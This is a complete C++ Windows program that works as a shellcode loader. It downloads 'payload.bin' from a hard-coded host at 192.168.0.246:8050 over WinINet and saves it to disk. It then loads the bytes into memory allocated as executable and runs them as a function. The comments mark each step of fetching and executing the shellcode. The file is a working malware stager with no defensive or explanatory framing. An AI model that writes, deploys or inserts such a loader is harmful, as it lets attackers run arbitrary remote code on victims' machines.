#include <iostream>
#include <fstream>
#include <windows.h>
#include <wininet.h>

#pragma comment(lib, "wininet.lib")

bool DownloadFile(const char* url, const char* filePath) {
    HINTERNET hInternet = InternetOpenA("UserAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return false;

    HINTERNET hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return false;
    }

    std::ofstream file(filePath, std::ios::binary);
    if (!file.is_open()) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }

    char buffer[1024];
    DWORD bytesRead;
    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        file.write(buffer, bytesRead);
    }

    file.close();
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return true;
}

int main() {
    const char* url = "http://192.168.0.246:8050/payload.bin";
    const char* filePath = "downloaded_file.bin";

    if (!DownloadFile(url, filePath)) {
        std::cerr << "Failed to download the file.\n";
        return 1;
    }

    // Reading the downloaded shellcode from the file into a buffer
    std::ifstream file(filePath, std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        std::cerr << "Failed to open the file.\n";
        return 1;
    }

    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);

    char* buffer = new char[size];
    if (!file.read(buffer, size)) {
        std::cerr << "Failed to read the file.\n";
        delete[] buffer;
        return 1;
    }
    file.close();

    // Step 2: Allocate memory and make it executable
    LPVOID allocatedMemory = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (allocatedMemory == NULL) {
        std::cerr << "Failed to allocate memory.\n";
        delete[] buffer;
        return 1;
    }

    // Step 3: Copy shellcode to the allocated memory
    memcpy(allocatedMemory, buffer, size);

    // Step 4: Execute the shellcode
    void (*shellcodeFunction)() = (void(*)())allocatedMemory;
    shellcodeFunction();

    // Cleanup
    delete[] buffer;
    VirtualFree(allocatedMemory, 0, MEM_RELEASE);

    return 0;
}
